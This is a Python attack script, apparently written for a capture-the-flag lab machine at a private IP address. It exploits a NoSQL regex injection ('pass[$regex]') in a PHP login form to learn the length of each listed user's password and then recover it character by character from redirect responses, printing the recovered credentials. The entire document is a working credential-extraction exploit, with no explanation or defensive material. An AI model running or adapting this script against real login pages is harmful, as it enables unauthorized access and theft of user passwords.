import requests

url = "http://10.10.158.207/login.php"

# =' Lista utenti da testare
user_list = ["admin", "secret", "john", "pedro"]

# Charset usato per il brute force
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "http://10.10.158.207/?err=1"
}

def try_password_regex(user, regex):
    data = {
        "user": user,
        "pass[$regex]": regex,
        "remember": "yes"
    }

    response = requests.post(url, data=data, headers=headers, allow_redirects=False)
    location = response.headers.get("Location", "")
    return response.status_code == 302 and "/sekr3tPl4ce.php" in location

def find_password_length(user, max_length=32):
    print(f"[*] Tryng to find password lenght for: {user}")
    for length in range(1, max_length + 1):
        regex = f"^.{{{length}}}$"
        if try_password_regex(user, regex):
            print(f"[+] Password lenght for {user} is {length}")
            return length
    print(f"[-] Not able to find password's lenght for {user}")
    return None

def brute_force_password(user, length):
    print(f"[*] Brute forcing password for {user} (length: {length})...")
    password = ""

    for position in range(length):
        for char in charset:
            attempt = password + char
            regex = f"^{attempt}{'.' * (length - len(attempt))}$"
            if try_password_regex(user, regex):
                password += char
                # print(f"[+] {user}: Char {position+1}/{length} found: {char}")
                break
        else:
            # print(f"[-] No valid char found at {position + 1} for {user}")
            break

    print(f"[++] Password found for {user}: {password}\n")
    return password

if __name__ == "__main__":
    results = {}

    for user in user_list:
        length = find_password_length(user)
        if length:
            password = brute_force_password(user, length)
            results[user] = password
        else:
            results[user] = None

    print("\n=== Final results ===")
    for user, pwd in results.items():
        if pwd:
            print(f"{user}: {pwd}")
        else:
            print(f"{user}: password not found")
